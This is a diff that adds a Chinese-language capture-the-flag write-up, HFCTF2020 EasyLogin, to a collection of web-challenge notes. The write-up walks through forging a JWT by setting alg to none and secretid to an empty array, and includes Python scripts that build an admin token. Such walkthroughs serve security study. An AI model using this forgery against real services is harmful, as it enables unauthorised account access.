@@ -1199,6 +1199,8 @@ so:
 
 ### CISCN2019华北赛区 Day1 Web2 ikun(JWT python反序列化)
 
+[另一道和jwt有关的题](#hfctf2020easyloginjwt伪造)
+
 1. 进来看到提示购买lv6，直接翻页找不到,翻页时发现url里有页面索引,直接脚本跑
 
     ```python
@@ -1295,6 +1297,76 @@ so:
     得到payload后，利用bp修改become的值为payload
 
     *注意 : 每次发送请求都要将jwt中的username改为admin*
+
+## HFCTF2020EasyLogin(JWT伪造)
+
+**考点**
+- JS代码审计
+- jwt漏洞破解
+
+1. 查看网页源码，发现有个app.js,之所以注意到这个，是因为它和其他的js脚本位置不一样，感觉不像是普通的js脚本。在网络选项卡中有个与app.js有关的请求。双击就能看到app.js源码。
+2. 根据源码提示，这道题采用了koa框架
+
+    koa项目文件框架
+    ```lua
+    |-- root
+    |   |-- app
+    |   |   |-- controllers  //控制器业务逻辑
+    |   |   |   |-- xx.js
+    |   |   |   |-- xx.js
+    |   |   |-- routes
+    |   |   |   |-- xx.js
+    |   |   |   |-- xx.js
+    |   |   |-- node_moudles  //各个功能实现代码
+    |   |   |   |-- xx.js
+    |   |   |   |-- xx.js
+    ```
+    按照koa框架的常见结构去获取下控制器文件的源码。
+
+    `/controllers/api.js`
+
+    `/api/flag`路径校验为admin用户时才会返回flag，而登录验证方式采用的是JWT，所以可以尝试对JWT进行破解修改。，并且生成JWT是用HS256加密，可以把它改为`none`来进行破解。标题中的`alg`字段更改为`none`，有些JWT库支持无算法，即没有签名算法。当alg为none时，后端将不执行签名验证。 此外对于本题中验证采用的密匙`secret`值也需要为空或者`undefined`否则还是会触发验证，所以将JWT中`secretid`项修改为`[]`。
+
+    综上所述，一共要修改三个地方：
+
+    - 第一个是username，修改为admin
+
+    - 第二个是alog，修改为none
+
+    - 第三个是secretid，修改为[]
+
+    首先，要获取自己的jwt值，需要用burpsuite登录抓包
+
+    然后复制authorization后面的内容，也就是自己的jwt,可以用bp的jwt插件解码，获取自己的jwt值，生成新的jwt，JWT前两部分都是base64加密，加密脚本如下：
+
+    ```python
+    # 这种方式需要把'='去掉，然后加'.'最后把两个值拼在一起
+    import base64
+
+    header = '{"alg":"none","typ":"JWT"}'
+    payload = '{"secretid":[],"username":"admin","password":"aaa","iat":1713526181}'
+
+    print(base64.b64encode(header.encode('utf-8')))
+    print(base64.b64encode(payload.encode('utf-8')))
+    # 或
+    # 这种方式需要提前安装jwt库
+    import jwt
+
+    token = jwt.encode(
+    {
+    "secretid": [],
+    "username": "admin",
+    "password": "123",
+    "iat": 1662825424  # 在burpsuite里拿到的jwt里的iat值。
+    },
+    algorithm="none",key="").encode(encoding='utf-8')
+    
+    print(token)
+    ```
+
+    得到新的token后重新赋值给authorization，放包，返回浏览器,点那个获取flag的按钮会发送一个flag的请求，网络选项卡相应里面有flag，或者可以直接访问/api/flag也能拿到。
+
+    *这里要注意username和password要和新生成的jwt中的一致*
 
 ## SUCTF2019 CheckIn(文件上传漏洞)
 
